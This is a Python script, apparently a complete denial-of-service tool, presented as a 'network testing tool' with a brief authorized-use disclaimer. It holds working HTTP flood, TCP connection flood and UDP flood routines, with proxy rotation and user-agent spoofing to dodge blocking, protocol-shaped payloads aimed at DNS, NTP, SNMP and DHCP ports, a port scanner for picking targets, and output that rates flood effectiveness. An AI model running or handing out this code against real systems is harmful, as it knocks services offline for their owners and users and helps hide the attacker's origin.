#!/usr/bin/env python3
"""
High-Performance Network Testing Tool
Supports both Layer 4 (TCP/UDP) and Layer 7 (HTTP) attacks
Developed by Upendra Khanal

⚠️ DISCLAIMER: This tool is for educational and authorized testing purposes only.
Do not use on systems you don't own or have explicit permission to test.
"""

import asyncio
import aiohttp
import socket
import time
import random
import sys
import os
from urllib.parse import urlparse
from typing import List, Optional, Tuple
import signal
import re

# Try to import uvloop for better performance on Unix systems
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_AVAILABLE = True
except ImportError:
    UVLOOP_AVAILABLE = False

class NetworkTester:
    def __init__(self):
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': 0,
            'peak_rps': 0,
            'current_rps': 0,
            'last_update': 0,
            'last_print': 0
        }
        self.running = True
        self.proxies = []
        
    def parse_target(self, target: str) -> Tuple[str, int, str]:
        """
        Parse target URL/host and extract host, port, and scheme
        Returns: (host, port, scheme)
        """
        # Clean the input
        target = target.strip()
        
        # If it looks like a URL, parse it
        if target.startswith(('http://', 'https://', 'ftp://', 'ftps://')):
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port
            scheme = parsed.scheme
            
            # Set default ports based on scheme
            if port is None:
                if scheme == 'https':
                    port = 443
                elif scheme == 'http':
                    port = 80
                elif scheme == 'ftp':
                    port = 21
                elif scheme == 'ftps':
                    port = 990
                else:
                    port = 80  # Default fallback
                    
            return host, port, scheme
            
        # If it contains a port (host:port format)
        elif ':' in target:
            parts = target.split(':')
            if len(parts) == 2:
                host = parts[0]
                try:
                    port = int(parts[1])
                    return host, port, 'tcp'
                except ValueError:
                    # Invalid port, treat as hostname
                    return target, 80, 'tcp'
            else:
                # Multiple colons, might be IPv6
                return target, 80, 'tcp'
                
        # Just a hostname/IP
        else:
            return target, 80, 'tcp'
    
    def get_common_ports(self) -> dict:
        """Get dictionary of common services and their ports"""
        return {
            'http': 80,
            'https': 443,
            'ssh': 22,
            'ftp': 21,
            'ftps': 990,
            'smtp': 25,
            'pop3': 110,
            'imap': 143,
            'dns': 53,
            'mysql': 3306,
            'postgresql': 5432,
            'redis': 6379,
            'mongodb': 27017,
            'elasticsearch': 9200,
            'http-alt': 8080,
            'https-alt': 8443,
            'proxy': 3128,
            'socks': 1080
        }
    
    def suggest_ports(self, host: str) -> List[int]:
        """Suggest common ports to test based on hostname"""
        suggestions = []
        host_lower = host.lower()
        
        # Web servers
        if any(keyword in host_lower for keyword in ['www', 'web', 'site', 'blog', 'shop']):
            suggestions.extend([80, 443, 8080, 8443])
        
        # Database servers
        elif any(keyword in host_lower for keyword in ['db', 'database', 'mysql', 'postgres', 'mongo']):
            suggestions.extend([3306, 5432, 27017])
        
        # Mail servers
        elif any(keyword in host_lower for keyword in ['mail', 'smtp', 'pop', 'imap']):
            suggestions.extend([25, 110, 143, 587, 993, 995])
        
        # Default web ports
        else:
            suggestions.extend([80, 443])
            
        return suggestions
    
    def display_target_info(self, host: str, port: int, scheme: str):
        """Display parsed target information"""
        print(f"\n🎯 Target Information:")
        print(f"   Host: {host}")
        print(f"   Port: {port}")
        print(f"   Service: {scheme}")
        
        # Show what service typically runs on this port
        common_ports = self.get_common_ports()
        service_name = None
        for service, service_port in common_ports.items():
            if service_port == port:
                service_name = service
                break
                
        if service_name:
            print(f"   Common Service: {service_name}")
        
        # Test connectivity
        print(f"   Testing connectivity...")
        if self.test_connectivity(host, port):
            print(f"   ✅ Port {port} is open and reachable")
        else:
            print(f"   ⚠️ Port {port} appears closed or filtered")
    
    def test_connectivity(self, host: str, port: int, timeout: int = 5) -> bool:
        """Test if a port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def scan_common_ports(self, host: str, timeout: int = 3) -> List[int]:
        """Scan common ports and return open ones"""
        print(f"\n🔍 Scanning common ports on {host}...")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            if self.test_connectivity(host, port, timeout):
                open_ports.append(port)
                print(f"   ✅ Port {port} is open")
            else:
                print(f"   ❌ Port {port} is closed", end='\r')
        
        print(f"\n🎯 Found {len(open_ports)} open ports: {open_ports}")
        return open_ports
        
    def load_proxies(self, proxy_file: str) -> List[str]:
        """Load proxies from file"""
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"✅ Loaded {len(proxies)} proxies")
            return proxies
        except FileNotFoundError:
            print(f"❌ Proxy file '{proxy_file}' not found")
            return []
        except Exception as e:
            print(f"❌ Error loading proxies: {e}")
            return []

    def get_random_user_agent(self) -> str:
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        return random.choice(user_agents)

    def update_stats(self, success: bool = True):
        """Update request statistics"""
        self.stats['total_requests'] += 1
        if success:
            self.stats['successful_requests'] += 1
        else:
            self.stats['failed_requests'] += 1
            
        current_time = time.time()
        if current_time - self.stats['last_update'] >= 1:
            elapsed = current_time - self.stats['start_time']
            if elapsed > 0:
                self.stats['current_rps'] = self.stats['total_requests'] / elapsed
                if self.stats['current_rps'] > self.stats['peak_rps']:
                    self.stats['peak_rps'] = self.stats['current_rps']
            self.stats['last_update'] = current_time

    def print_stats(self, force: bool = False):
        """Print current statistics with rate limiting"""
        current_time = time.time()
        
        # Only print every 0.5 seconds to avoid spam
        if not force and current_time - self.stats['last_print'] < 0.5:
            return
            
        self.stats['last_print'] = current_time
        elapsed = current_time - self.stats['start_time']
        success_rate = (self.stats['successful_requests'] / max(1, self.stats['total_requests'])) * 100
        
        # Clear the line and print stats
        print(f"\r📊 Requests: {self.stats['total_requests']} | "
              f"✅ Success: {self.stats['successful_requests']} | "
              f"❌ Failed: {self.stats['failed_requests']} | "
              f"📈 Success Rate: {success_rate:.1f}% | "
              f"⚡ RPS: {self.stats['current_rps']:.1f} | "
              f"🔥 Peak RPS: {self.stats['peak_rps']:.1f} | "
              f"⏱️ Time: {elapsed:.1f}s", end='', flush=True)

    async def layer7_attack(self, url: str, num_requests: int, concurrency: int, 
                           timeout: int, custom_headers: dict, method: str = 'GET'):
        """Layer 7 HTTP flood attack"""
        print(f"\n🚀 Starting Layer 7 HTTP attack on {url}")
        print(f"📋 Method: {method} | Requests: {num_requests} | Concurrency: {concurrency}")
        
        # Test initial connection and get title
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Extract title
                        title_start = content.find('<title>')
                        title_end = content.find('</title>')
                        if title_start != -1 and title_end != -1:
                            title = content[title_start + 7:title_end].strip()
                            print(f"🎯 Target: {title}")
                    print(f"✅ Initial connection successful (Status: {response.status})")
        except Exception as e:
            print(f"⚠️ Initial connection failed: {e}")
            print("Continuing with attack anyway...")

        self.stats['start_time'] = time.time()
        
        # Create semaphore to limit concurrency
        semaphore = asyncio.Semaphore(concurrency)
        
        async def make_request(session, request_id):
            async with semaphore:
                if not self.running:
                    return
                    
                try:
                    # Select random proxy if available
                    proxy = random.choice(self.proxies) if self.proxies else None
                    
                    # Prepare headers
                    headers = {
                        'User-Agent': self.get_random_user_agent(),
                        **custom_headers
                    }
                    
                    # Make request based on method
                    if method.upper() == 'GET':
                        async with session.get(url, headers=headers, proxy=proxy) as response:
                            await response.read()
                    elif method.upper() == 'POST':
                        data = {'data': f'request_{request_id}'}
                        async with session.post(url, headers=headers, data=data, proxy=proxy) as response:
                            await response.read()
                    elif method.upper() == 'HEAD':
                        async with session.head(url, headers=headers, proxy=proxy) as response:
                            pass
                    
                    self.update_stats(True)
                    
                except Exception:
                    self.update_stats(False)

        # Create session with custom timeout
        timeout_config = aiohttp.ClientTimeout(total=timeout)
        connector = aiohttp.TCPConnector(limit=concurrency * 2, limit_per_host=concurrency)
        
        async with aiohttp.ClientSession(timeout=timeout_config, connector=connector) as session:
            # Create tasks in batches to avoid memory issues
            batch_size = min(1000, concurrency * 10)
            
            for batch_start in range(0, num_requests, batch_size):
                if not self.running:
                    break
                    
                batch_end = min(batch_start + batch_size, num_requests)
                tasks = []
                
                for i in range(batch_start, batch_end):
                    if not self.running:
                        break
                    task = asyncio.create_task(make_request(session, i))
                    tasks.append(task)
                
                # Wait for batch to complete
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                # Print stats after each batch
                self.print_stats()
                
                # Small delay between batches
                await asyncio.sleep(0.1)

        print(f"\n✅ Layer 7 attack completed!")

    async def layer4_tcp_attack(self, host: str, port: int, num_connections: int, 
                               concurrency: int, timeout: int):
        """Layer 4 TCP flood attack"""
        print(f"\n🚀 Starting Layer 4 TCP attack on {host}:{port}")
        print(f"📋 Connections: {num_connections} | Concurrency: {concurrency}")
        
        self.stats['start_time'] = time.time()
        semaphore = asyncio.Semaphore(concurrency)
        
        async def tcp_connect(connection_id):
            async with semaphore:
                if not self.running:
                    return
                    
                try:
                    # Create TCP connection
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port),
                        timeout=timeout
                    )
                    
                    # Send some data
                    writer.write(b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n')
                    await writer.drain()
                    
                    # Keep connection open briefly
                    await asyncio.sleep(0.1)
                    
                    writer.close()
                    await writer.wait_closed()
                    
                    self.update_stats(True)
                    
                except Exception:
                    self.update_stats(False)

        # Create tasks in batches
        batch_size = min(500, concurrency * 5)
        
        for batch_start in range(0, num_connections, batch_size):
            if not self.running:
                break
                
            batch_end = min(batch_start + batch_size, num_connections)
            tasks = []
            
            for i in range(batch_start, batch_end):
                if not self.running:
                    break
                task = asyncio.create_task(tcp_connect(i))
                tasks.append(task)
            
            # Wait for batch to complete
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            # Print stats after each batch
            self.print_stats()
            
            # Small delay between batches
            await asyncio.sleep(0.1)
            
        print(f"\n✅ Layer 4 TCP attack completed!")

    async def layer4_udp_attack(self, host: str, port: int, num_packets: int, 
                               concurrency: int, packet_size: int = 1024):
        """Enhanced Layer 4 UDP flood attack"""
        print(f"\n🚀 Starting Enhanced Layer 4 UDP attack on {host}:{port}")
        print(f"📋 Packets: {num_packets} | Concurrency: {concurrency} | Packet Size: {packet_size} bytes")
        
        self.stats['start_time'] = time.time()
        semaphore = asyncio.Semaphore(concurrency)
        
        # Create multiple payload types for better effectiveness
        payloads = [
            # Random data payload
            os.urandom(packet_size),
            # DNS query-like payload (for port 53)
            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01',
            # NTP request-like payload (for port 123)
            b'\x1b' + b'\x00' * 47,
            # DHCP discover-like payload (for port 67/68)
            b'\x01\x01\x06\x00' + os.urandom(236),
            # SNMP get-request-like payload (for port 161)
            b'\x30\x26\x02\x01\x00\x04\x06public\xa0\x19\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00',
            # Amplified payload (larger size)
            b'A' * packet_size
        ]
        
        async def send_udp_packet(packet_id):
            async with semaphore:
                if not self.running:
                    return
                    
                try:
                    # Create UDP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setblocking(False)
                    
                    # Select payload based on port or random
                    if port == 53:  # DNS
                        payload = payloads[1]
                    elif port == 123:  # NTP
                        payload = payloads[2]
                    elif port in [67, 68]:  # DHCP
                        payload = payloads[3]
                    elif port == 161:  # SNMP
                        payload = payloads[4]
                    else:
                        # Use random payload or large payload
                        payload = random.choice([payloads[0], payloads[5]])
                    
                    # Send packet
                    await asyncio.get_event_loop().sock_sendto(sock, payload, (host, port))
                    sock.close()
                    
                    self.update_stats(True)
                    
                except Exception:
                    self.update_stats(False)

        # Create tasks in batches for better performance
        batch_size = min(2000, concurrency * 20)  # Larger batches for UDP
        
        for batch_start in range(0, num_packets, batch_size):
            if not self.running:
                break
                
            batch_end = min(batch_start + batch_size, num_packets)
            tasks = []
            
            for i in range(batch_start, batch_end):
                if not self.running:
                    break
                task = asyncio.create_task(send_udp_packet(i))
                tasks.append(task)
            
            # Wait for batch to complete
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            # Print stats after each batch
            self.print_stats()
            
            # Smaller delay for UDP (faster sending)
            await asyncio.sleep(0.05)
            
        print(f"\n✅ Layer 4 UDP attack completed!")

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n\n🛑 Stopping attack...")
        self.running = False

def main():
    print("⚡ High-Performance Network Testing Tool")
    print("Developed by Upendra Khanal")
    print("=" * 50)
    
    if UVLOOP_AVAILABLE:
        print("🚀 uvloop enabled for better performance")
    
    tester = NetworkTester()
    
    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, tester.signal_handler)
    
    try:
        # Choose attack type
        print("\n🎯 Select Attack Type:")
        print("1. Layer 7 (HTTP/HTTPS)")
        print("2. Layer 4 TCP")
        print("3. Layer 4 UDP")
        print("4. Port Scanner (Reconnaissance)")
        
        choice = input("\nEnter your choice (1-4): ").strip()
        
        if choice == "1":
            # Layer 7 HTTP Attack
            url = input("🌐 Enter target URL (e.g., https://example.com or example.com): ").strip()
            
            # Auto-format URL if needed
            if not url.startswith(('http://', 'https://')):
                # Check if it's likely HTTPS
                if 'secure' in url.lower() or url.endswith('.bank') or url.endswith('.gov'):
                    url = 'https://' + url
                else:
                    url = 'http://' + url
            
            # Parse and display target info
            host, port, scheme = tester.parse_target(url)
            tester.display_target_info(host, port, scheme)
                
            num_requests = int(input("📊 Enter number of requests to send: "))
            concurrency = int(input("⚡ Enter concurrency level (parallel connections): "))
            
            # Optional parameters
            timeout = int(input("⏱️ Enter timeout in seconds (default 10): ") or "10")
            method = input("📋 Enter HTTP method (GET/POST/HEAD, default GET): ").strip().upper() or "GET"
            
            # Custom headers
            custom_headers = {}
            add_headers = input("🔧 Add custom headers? (y/n): ").strip().lower()
            if add_headers == 'y':
                while True:
                    header = input("Enter header (format: 'Name: Value', empty to finish): ").strip()
                    if not header:
                        break
                    if ':' in header:
                        name, value = header.split(':', 1)
                        custom_headers[name.strip()] = value.strip()
            
            # Proxy support
            proxy_file = input("📁 Enter proxy file path (optional, press Enter to skip): ").strip()
            if proxy_file:
                tester.proxies = tester.load_proxies(proxy_file)
            
            # Run Layer 7 attack
            asyncio.run(tester.layer7_attack(url, num_requests, concurrency, timeout, custom_headers, method))
            
        elif choice == "2":
            # Layer 4 TCP Attack
            target = input("🎯 Enter target (URL, host:port, or just host): ").strip()
            
            # Parse target automatically
            host, port, scheme = tester.parse_target(target)
            
            # Display parsed information
            tester.display_target_info(host, port, scheme)
            
            # Ask if user wants to change the port
            change_port = input(f"\n🔧 Current port is {port}. Change it? (y/n): ").strip().lower()
            if change_port == 'y':
                # Show common ports
                common_ports = tester.get_common_ports()
                print("\n📋 Common ports:")
                for service, service_port in list(common_ports.items())[:10]:
                    print(f"   {service}: {service_port}")
                
                new_port = input(f"Enter new port (current: {port}): ").strip()
                if new_port.isdigit():
                    port = int(new_port)
                    print(f"✅ Port changed to {port}")
            
            # Option to scan for open ports
            scan_ports = input("🔍 Scan for open ports first? (y/n): ").strip().lower()
            if scan_ports == 'y':
                open_ports = tester.scan_common_ports(host)
                if open_ports:
                    print(f"\n🎯 Select a port from open ports: {open_ports}")
                    selected_port = input(f"Enter port to attack (current: {port}): ").strip()
                    if selected_port.isdigit() and int(selected_port) in open_ports:
                        port = int(selected_port)
                        print(f"✅ Selected port {port}")
                
            num_connections = int(input("📊 Enter number of connections: "))
            concurrency = int(input("⚡ Enter concurrency level: "))
            timeout = int(input("⏱️ Enter timeout in seconds (default 5): ") or "5")
            
            # Run Layer 4 TCP attack
            asyncio.run(tester.layer4_tcp_attack(host, port, num_connections, concurrency, timeout))
            
        elif choice == "3":
            # Enhanced Layer 4 UDP Attack
            target = input("🎯 Enter target (URL, host:port, or just host): ").strip()
            
            # Parse target automatically
            host, port, scheme = tester.parse_target(target)
            
            # Display parsed information
            tester.display_target_info(host, port, scheme)
            
            # Suggest UDP ports
            print(f"\n💡 Common UDP ports for testing:")
            udp_ports = {
                53: "DNS",
                123: "NTP", 
                161: "SNMP",
                67: "DHCP Server",
                68: "DHCP Client",
                69: "TFTP",
                514: "Syslog",
                1900: "UPnP"
            }
            
            for udp_port, service in udp_ports.items():
                print(f"   {udp_port}: {service}")
            
            # Ask if user wants to change the port
            change_port = input(f"\n🔧 Current port is {port}. Change it? (y/n): ").strip().lower()
            if change_port == 'y':
                new_port = input(f"Enter new port (current: {port}): ").strip()
                if new_port.isdigit():
                    port = int(new_port)
                    print(f"✅ Port changed to {port}")
                    
                    # Show what service this port typically runs
                    if port in udp_ports:
                        print(f"🎯 Targeting {udp_ports[port]} service")
                
            num_packets = int(input("📊 Enter number of packets: "))
            concurrency = int(input("⚡ Enter concurrency level: "))
            packet_size = int(input("📦 Enter packet size in bytes (default 1024): ") or "1024")
            
            # Run Enhanced Layer 4 UDP attack
            asyncio.run(tester.layer4_udp_attack(host, port, num_packets, concurrency, packet_size))
            
        elif choice == "4":
            # Port Scanner
            target = input("🎯 Enter target (URL or hostname): ").strip()
            host, _, _ = tester.parse_target(target)
            
            print(f"\n🔍 Port scanning options for {host}:")
            print("1. Quick scan (common ports)")
            print("2. Custom port range")
            print("3. Specific ports")
            
            scan_choice = input("Select scan type (1-3): ").strip()
            
            if scan_choice == "1":
                open_ports = tester.scan_common_ports(host)
            elif scan_choice == "2":
                start_port = int(input("Enter start port: "))
                end_port = int(input("Enter end port: "))
                print(f"\n🔍 Scanning ports {start_port}-{end_port} on {host}...")
                open_ports = []
                for port in range(start_port, end_port + 1):
                    if tester.test_connectivity(host, port, 1):
                        open_ports.append(port)
                        print(f"   ✅ Port {port} is open")
                print(f"\n🎯 Found {len(open_ports)} open ports: {open_ports}")
            elif scan_choice == "3":
                ports_input = input("Enter ports separated by commas (e.g., 80,443,22): ")
                ports = [int(p.strip()) for p in ports_input.split(',') if p.strip().isdigit()]
                open_ports = []
                for port in ports:
                    if tester.test_connectivity(host, port, 3):
                        open_ports.append(port)
                        print(f"   ✅ Port {port} is open")
                    else:
                        print(f"   ❌ Port {port} is closed")
                print(f"\n🎯 Found {len(open_ports)} open ports: {open_ports}")
            
            return  # Exit after scanning
            
        else:
            print("❌ Invalid choice!")
            return
            
    except KeyboardInterrupt:
        print(f"\n\n🛑 Attack stopped by user")
    except ValueError as e:
        print(f"❌ Invalid input: {e}")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    # Final stats
    if tester.stats['total_requests'] > 0:
        print(f"\n\n📈 Final Statistics:")
        print(f"   Total Requests/Connections: {tester.stats['total_requests']}")
        print(f"   Successful: {tester.stats['successful_requests']}")
        print(f"   Failed: {tester.stats['failed_requests']}")
        success_rate = (tester.stats['successful_requests'] / tester.stats['total_requests']) * 100
        print(f"   Success Rate: {success_rate:.1f}%")
        print(f"   Peak RPS: {tester.stats['peak_rps']:.1f}")
        elapsed = time.time() - tester.stats['start_time']
        print(f"   Total Time: {elapsed:.1f} seconds")
        
        # Explain what happened
        print(f"\n💡 Analysis:")
        if tester.stats['successful_requests'] > 0:
            print(f"   ✅ Successfully sent {tester.stats['successful_requests']} UDP packets")
            print(f"   📊 This demonstrates high-volume packet transmission capability")
            if tester.stats['peak_rps'] > 1000:
                print(f"   🔥 Excellent RPS achieved - very effective UDP flood")
            elif tester.stats['peak_rps'] > 100:
                print(f"   ⚡ Good RPS achieved - effective network stress test")
            else:
                print(f"   ⚠️ Low RPS - may be limited by network or system resources")
        else:
            print(f"   ❌ No packets sent successfully - check network connectivity")

if __name__ == "__main__":
    main()